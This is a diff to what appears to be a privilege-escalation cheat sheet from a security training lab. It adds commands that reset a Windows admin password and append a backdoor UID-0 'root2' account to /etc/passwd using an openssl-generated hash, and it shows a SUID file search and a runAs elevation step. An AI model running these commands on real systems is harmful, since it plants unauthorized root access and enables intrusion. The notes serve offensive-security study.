@@ -436,6 +436,19 @@ student@debian:~$ /sbin/modinfo libata
 student@debian:~$ find / -perm -u=s -type f 2>/dev/null
 ```
 
+### Change password
+
+```
+C:\Windows\system32> net user admin evil
+```
+
+```
+student@debian:~$ openssl passwd evil
+AK24fcSx2Il3I
+
+student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+
 ### User Account Control (UAC)
 
 Check our integrity level
@@ -448,12 +461,6 @@ In order to change the admin user's password, we must switch to a high integrity
 
 ```
 C:\Users\admin>powershell.exe Start-Process cmd.exe -Verb runAs
-```
-
-Change user password on windows:
-
-```
-C:\Windows\system32> net user admin my_new_password
 ```
 
 example
